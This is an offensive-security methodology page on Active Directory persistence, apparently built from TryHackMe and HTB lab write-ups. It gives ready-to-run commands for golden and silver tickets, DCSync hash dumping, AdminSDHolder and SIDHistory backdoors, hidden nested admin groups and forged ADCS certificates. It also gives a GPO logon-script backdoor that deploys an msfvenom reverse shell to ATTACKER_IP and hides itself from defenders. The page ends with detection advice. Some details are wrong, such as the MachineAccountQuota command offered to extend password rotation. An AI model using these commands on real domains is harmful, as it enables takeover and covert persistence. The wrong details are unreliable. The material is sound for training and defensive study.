---
title: "Active Directory Persistence"
type: technique
tags: [0xdf, access-control, active-directory, golden-ticket, gpo, htb, kerberos, persistence, post-exploitation, silver-ticket, thm, windows]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [thm-ad-persistence, 0xdf-windows-ad]
---

# Active Directory Persistence

## What it is

AD persistence techniques allow an attacker who has achieved elevated access to maintain that access even after password resets, account lockouts, or detection of the original compromise vector. Unlike simple backdoor accounts, the best persistence mechanisms are woven into core AD structures that defenders may not think to inspect.

## How it works

AD stores privilege information in several places beyond just group membership: Kerberos ticket-signing keys (krbtgt), service ticket session keys (machine account hashes), ACL entries on directory objects, Group Policy Objects, and the SIDHistory attribute. Attackers who have achieved Domain Admin (or equivalent) can plant backdoors in any of these layers, each of which survives password resets of other accounts.

## Prerequisites

- **Golden ticket:** krbtgt account hash + Domain SID + Domain FQDN (requires DC access — typically Domain Admin)
- **Silver ticket:** target machine account hash + Domain SID (requires local admin on the machine, or DCSync)
- **ACL abuse (AdminSDHolder):** Domain Admin to modify the AdminSDHolder ACL
- **GPO abuse:** Domain Admin or account with GPO create/link privileges on an OU
- **SID History injection:** Domain Admin + direct ntds.dit access (stop NTDS service)
- **Group membership nesting:** Domain Admin to create groups and modify membership

## Methodology

### 1. Golden Ticket

A golden ticket is a forged TGT signed with the krbtgt account's hash. Because the KDC trusts anything signed with that key, a golden ticket grants access to any service in the domain as any user — including users that don't exist. Timestamps can be spoofed, and the ticket can be valid for years.

**Required information:**
- krbtgt NTLM hash
- Domain FQDN
- Domain SID
- RID of the account to impersonate (500 = built-in Administrator)

**Step 1 — Dump the krbtgt hash (from a DC):**
```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
# Look for: User : krbtgt / Hash NTLM: <hash>
```

Or via DCSync (no local access to DC required if you have Replicating Directory Changes All):
```
mimikatz # lsadump::dcsync /user:krbtgt /domain:za.tryhackme.loc
```

**Step 2 — Get the Domain SID:**
```powershell
Get-ADDomain | Select-Object -ExpandProperty DomainSID
# Or from mimikatz output above
```

**Step 3 — Forge the golden ticket and inject it:**
```
mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
```

Parameters:
- `/admin` — username to embed (can be anything, even non-existent)
- `/id:500` — RID of local Administrator group
- `/endin` — ticket lifetime in minutes (600 = 10 hours)
- `/renewmax` — max renewals in minutes (10080 = 7 days)
- `/ptt` — inject directly into current session (alternatively, `/ticket:output.kirbi` to save)

**Step 4 — Verify access:**
```cmd
dir \\thmdc.za.tryhackme.loc\C$\Users
```

### 2. Silver Ticket

A silver ticket is a forged TGS for a specific service, signed with the machine account's hash. It never contacts the KDC — only the attacker and the target service are involved. It is more stealthy than a golden ticket but limited to one service on one machine.

**Required information:**
- Target machine account NTLM hash
- Domain SID
- Service name (SPN type, e.g., `cifs` for SMB file access)

```
mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:thmserver1.za.tryhackme.loc /rc4:<machine_account_NTLM_hash> /service:cifs /endin:600 /renewmax:10080 /ptt
```

Access the service:
```cmd
dir \\thmserver1.za.tryhackme.loc\C$\Users
```

To keep a silver ticket valid, extend the machine account password rotation interval (default 30 days):
```powershell
Set-ADComputer TARGET -Replace @{msDS-MachineAccountQuota="0"}
# Or modify password expiry via group policy
```

### 3. ACL Abuse — AdminSDHolder

The `AdminSDHolder` container holds an ACL template that the `SDProp` process (runs every 60 minutes) copies to all protected groups (Domain Admins, Administrators, Enterprise Admins, Schema Admins, etc.). Adding a Full Control ACE for a low-privileged user here causes persistent admin-equivalent access even after a blue team removes direct group membership.

**Via MMC (interactive):**
1. Open MMC → Add/Remove Snap-in → Active Directory Users and Computers
2. View → Advanced Features
3. Navigate to Domain → System → AdminSDHolder
4. Right-click → Properties → Security
5. Add your low-privileged user → grant Full Control

**Trigger SDProp immediately (instead of waiting 60 minutes):**
```powershell
Import-Module .\Invoke-ADSDPropagation.ps1
Invoke-ADSDPropagation
```

**Via PowerShell directly (requires AD module):**
```powershell
# Grant GenericAll on AdminSDHolder to a low-priv user
$acl = Get-ACL "AD:\CN=AdminSDHolder,CN=System,DC=za,DC=tryhackme,DC=loc"
$identity = [System.Security.Principal.NTAccount]"za\lowprivuser"
$adRights = [System.DirectoryServices.ActiveDirectoryRights]"GenericAll"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $adRights, $type)
$acl.AddAccessRule($ace)
Set-ACL -AclObject $acl "AD:\CN=AdminSDHolder,CN=System,DC=za,DC=tryhackme,DC=loc"
```

After SDProp propagates, the user has Full Control over all protected groups. They can add themselves to Domain Admins:
```powershell
Add-ADGroupMember -Identity "Domain Admins" -Members lowprivuser
```

### 4. GPO Abuse — Logon Script Backdoor

Group Policy Objects linked to OUs are processed by domain computers and users at login. An attacker with GPO create/edit rights can deploy a logon script that executes every time an admin authenticates to any machine in the target OU.

**Step 1 — Generate a reverse shell payload:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ATTACKER_IP lport=4445 -f exe > shell.exe
```

**Step 2 — Create a batch launcher script (`script.bat`):**
```batch
copy \\DOMAIN\sysvol\DOMAIN\scripts\shell.exe C:\tmp\shell.exe && timeout /t 20 && C:\tmp\shell.exe
```

**Step 3 — Copy both files to SYSVOL:**
```bash
scp shell.exe Administrator@THMDC:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
scp script.bat Administrator@THMDC:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

**Step 4 — Create a GPO via MMC:**
1. MMC → Group Policy Management snap-in
2. Right-click target OU (e.g., Admins) → Create a GPO and Link it here
3. Right-click new GPO → Enforced (so it wins against conflicting policies)
4. Edit GPO → User Configuration → Policies → Windows Settings → Scripts (Logon/Logoff)
5. Logon → Add → Browse → select `script.bat`

**Step 5 — Lock down the GPO so defenders can't delete it:**
1. GPO → Delegation tab
2. Remove all groups except ENTERPRISE DOMAIN CONTROLLERS
3. Advanced → remove creator/owner
4. Add "Domain Computers" with Read only (removes Authenticated Users = users can't read the policy, but computers still apply it)

**Start listener:**
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4445; exploit"
```

### 5. SID History Injection

The `SIDHistory` attribute on a user account is designed for cross-domain migrations. When a user authenticates, all SIDs in their SIDHistory are added to their access token. By injecting a privileged SID (e.g., Domain Admins S-1-5-21-...-512) into a low-privileged user's SIDHistory, that user gains the permissions of Domain Admin while appearing to be a normal user in group listings.

**Step 1 — Get the target user's current SID and Domain Admins SID:**
```powershell
Get-ADUser lowprivuser -properties sidhistory, memberof
Get-ADGroup "Domain Admins"
# Note Domain Admins SID: S-1-5-21-3885271727-2693558621-2658995185-512
```

**Step 2 — Patch SIDHistory directly in ntds.dit using DSInternals:**
```powershell
# Must be run on the DC
Stop-Service -Name ntds -force
Add-ADDBSidHistory -SamAccountName 'lowprivuser' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath C:\Windows\NTDS\ntds.dit
Start-Service -Name ntds
```

**Verify:**
```powershell
Get-ADUser lowprivuser -Properties sidhistory
# SIDHistory should now contain the Domain Admins SID

dir \\thmdc.za.tryhackme.loc\c$    # confirms DA-level access
```

To escalate to Enterprise Admin level (valid across all domains in the forest), inject the Enterprise Admins SID instead.

### 6. Group Membership Persistence via Nesting

Instead of adding a backdoor account directly to Domain Admins (which triggers alerts), create a chain of nested groups through inconspicuous OUs. Only the outermost group appears in the Domain Admins membership list.

```powershell
# Create 5 groups scattered across different OUs
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "BackdoorGroup1" -SamAccountName "backdoor_grp1" -GroupScope Global -GroupCategory Security
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "BackdoorGroup2" -SamAccountName "backdoor_grp2" -GroupScope Global -GroupCategory Security
New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "BackdoorGroup3" -SamAccountName "backdoor_grp3" -GroupScope Global -GroupCategory Security
New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "BackdoorGroup4" -SamAccountName "backdoor_grp4" -GroupScope Global -GroupCategory Security
New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "BackdoorGroup5" -SamAccountName "backdoor_grp5" -GroupScope Global -GroupCategory Security

# Chain them: 1 -> 2 -> 3 -> 4 -> 5 -> Domain Admins
Add-ADGroupMember -Identity 'backdoor_grp2' -Members 'backdoor_grp1'
Add-ADGroupMember -Identity 'backdoor_grp3' -Members 'backdoor_grp2'
Add-ADGroupMember -Identity 'backdoor_grp4' -Members 'backdoor_grp3'
Add-ADGroupMember -Identity 'backdoor_grp5' -Members 'backdoor_grp4'
Add-ADGroupMember -Identity 'Domain Admins' -Members 'backdoor_grp5'

# Add the low-privileged backdoor account to group 1
Add-ADGroupMember -Identity 'backdoor_grp1' -Members 'lowprivuser'
```

A query of Domain Admins members will show only `backdoor_grp5`, not the user or the chain.

## Key Payloads / Examples

DCSync (dump all domain hashes without logging into the DC):
```
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:Administrator
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
```

From Linux via Impacket:
```bash
secretsdump.py -just-dc DOMAIN/user:password@DC_IP
secretsdump.py -hashes :NTLM_HASH -just-dc DOMAIN/user@DC_IP
```

## From the Wild — persistence-shaped AD abuse (HTB, 0xdf)

These abuses are often reachable **before** full domain admin yet behave like persistence because they endure until someone removes ACLs or burns keys. Enumeration on [[ad-enumeration]]; lateral follow-through on [[ad-lateral-movement]]; Kerberos ticket depth on [[kerberos-attacks]]; PKI abuses on [[adcs]] / [[certipy]].

### DACL and replication-class footholds that outlive unrelated password resets

| Pattern | Survivability | Incident response knobs |
|---------|---------------|------------------------|
| Intentional **DCSync** delegation via `WriteDacl` / group membership manoeuvres | Attacker-controlled principal keeps replication rights across victim password rotations | Strip ACEs on domain root, remove group memberships, **double krbtgt** roll |
| Standing **GetChanges** + **GetChangesAll** on service accounts (Sauna-style mis-provisioning) | Same as long-lived DCSync | Disable service account, rebuild least-privilege model |
| **ForceChangePassword** pivots | Persists until victim password reset | Force password reset, audit RPC 445 from unusual hosts |
| **Shadow credentials** (`msDS-KeyCredentialLink`) | Survives password change for accounts that trust device keys | Remove rogue key links, monitor **Event ID 14** (Windows Hello for Business) and LDAP modify on attribute |

### Tickets and certificates in live HTB-style chains

- **Golden tickets** still require **krbtgt** material obtained through DCSync or NTDS extraction; Forest and Sauna emphasise how fast teams move once replication rights exist.
- **Silver tickets** surface when long-lived service or machine NT hashes leak (for example CIFS service abuse). Pair with silver ticket mitigations in methodology above.
- **Forged golden certificates** (subsection below) align with HTB **ADCS** abuse; template persistence and **ESC8** registration often remain valid until CA trust is rebuilt.

### Group nesting and GPO backdoors

BloodHound **Transitive Object Control** paths frequently expose the same style of **deep nested group** persistence described in methodology section 6. GPO-based logon scripts need both **GPO edit rights** and **SYSVOL** replication success, usually available only at tier zero in real environments.

## Bypasses and Variants

**ADCS Golden Certificate (persistence via Certificate Authority):**  
If the AD CS CA private key is extractable (not HSM-protected), it can be used to forge certificates indefinitely for any user:
```
mimikatz # crypto::capi        # patch CryptoAPI to allow export
mimikatz # crypto::cng         # patch CNG
mimikatz # crypto::certificates /systemstore:local_machine /export
```
Then use `ForgeCert.exe` to forge a certificate for any UPN:
```cmd
ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```
Request a TGT with the forged cert:
```cmd
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:admin.kirbi /domain:za.tryhackme.loc /dc:DC_IP
```

## Detection and Defence

- Monitor for new ACEs on AdminSDHolder (Event ID 5136 — directory service object modified)
- Alert on SDProp being manually triggered outside its 60-minute schedule
- Audit SIDHistory attribute changes — legitimate use is rare; any modification should trigger investigation
- Detect golden ticket use: tickets with unusually long lifetimes, or tickets for accounts that don't exist
- Monitor krbtgt hash extraction (DCSync — Event ID 4662 with Replication privileges)
- Periodically rotate the krbtgt password **twice** (one rotation invalidates old TGTs; the second is needed because one old KDC may still accept tickets signed with the previous key)
- Enable ATA/Defender for Identity to detect golden ticket and DCSync activity
- Review GPO delegation regularly; GPOs with restricted read permissions for Authenticated Users are suspicious
- Run BloodHound to identify non-obvious paths to Domain Admin through nested groups

## Tools

- Mimikatz — golden/silver ticket forge, DCSync, SIDHistory (lsadump::dcsync, kerberos::golden)
- Rubeus — Kerberos ticket requests (asktgt with certificate)
- ForgeCert — forge certificates from exported CA private key
- DSInternals — patch ntds.dit to inject SIDHistory (Add-ADDBSidHistory)
- Impacket — secretsdump.py for DCSync / remote hash extraction
- BloodHound — visualise persistent access paths via nested groups and ACLs
- PowerView — enumerate ACLs, group membership, AdminSDHolder

## Sources

- TryHackMe: Persisting Active Directory room
- TryHackMe: AD Certificate Templates (ADCS persistence via forged certs)
- HTB Windows Active Directory methodology writeups (`0xdf-windows-ad`), sampled for ACL and ticket durability lessons: Forest, Sauna, Blackfield, Rebound, Search, Support, Scrambled

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[ndis-hooking]]
- [[password-dsrm-credentials]]
- [[rdp-persistence]]
- [[windows-persistence]]
